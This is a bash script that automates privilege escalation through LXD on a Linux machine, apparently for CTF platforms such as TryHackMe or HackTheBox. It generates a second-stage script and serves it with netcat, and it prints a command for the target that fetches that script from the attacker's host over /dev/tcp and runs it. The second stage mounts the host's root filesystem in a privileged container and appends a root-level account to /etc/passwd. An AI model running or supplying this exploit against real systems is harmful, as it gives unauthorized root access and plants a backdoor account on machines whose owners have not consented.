#!/usr/bin/env bash

LHOST=$(ifconfig | grep "inet " | cut -d " " -f 10 | grep "10") # Here I grepped 10 for tun0 ip address (vpn connection, like tryhackme or hackthebox...), change it if trying to pwn a LOCAL MACHINE...
LPORT=8000 # Change this
ROOTNAME="user999" # Change this
ROOTPASS="passwd999" # Change this
LXD_EXPL=$(mktemp).sh
LPASS=$(openssl passwd -1 -salt mysalt $ROOTPASS)

bash ./alpine-builder.sh
echo
echo "Run in the remote machine: 'bash -c \"cat < /dev/tcp/$LHOST/$LPORT > /tmp/lxd-exploit.sh; bash /tmp/lxd-exploit.sh\"'"

echo "#!/usr/bin/env bash" > $LXD_EXPL
echo "cd ~" >> $LXD_EXPL
echo "echo \"echo '$ROOTNAME:$LPASS:0:0:root:/root:/bin/bash' >> /mnt/lxd-exploit/etc/passwd; exit\" > /tmp/newAccount.sh" >> $LXD_EXPL
echo "cat < /dev/tcp/$LHOST/$LPORT > ./alpine.tar.gz" >> $LXD_EXPL
echo "lxc image import ./alpine.tar.gz --alias alpineImg" >> $LXD_EXPL
echo "lxd init" >> $LXD_EXPL
echo "lxc init alpineImg alpineCon -c security.privileged=true" >> $LXD_EXPL
echo "lxc config device add alpineCon mydevice disk source=/ path=/mnt/lxd-exploit/ recursive=true" >> $LXD_EXPL
echo "lxc start alpineCon" >> $LXD_EXPL
echo "lxc exec alpineCon /bin/sh -c /mnt/lxd-exploit/tmp/newAccount.sh" >> $LXD_EXPL
echo "echo -e '$ROOTPASS\n' | su $ROOTNAME" >> $LXD_EXPL
echo
nc -q 10 -nvlp $LPORT < $LXD_EXPL
nc -q 10 -nvlp $LPORT < ./alpine.tar.gz
rm -f $LXD_EXPL
